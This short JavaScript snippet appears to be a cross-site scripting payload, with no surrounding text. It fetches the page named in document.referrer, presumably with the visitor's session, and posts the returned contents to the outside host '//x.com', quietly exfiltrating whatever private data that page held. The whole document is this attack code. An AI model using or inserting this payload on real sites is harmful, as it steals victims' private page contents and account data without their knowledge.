fetch(document.referrer)
  .then(response => response.text())
  .then(data => {
    fetch('//x.com', {
      method: 'POST',
      body: data
    });
  });
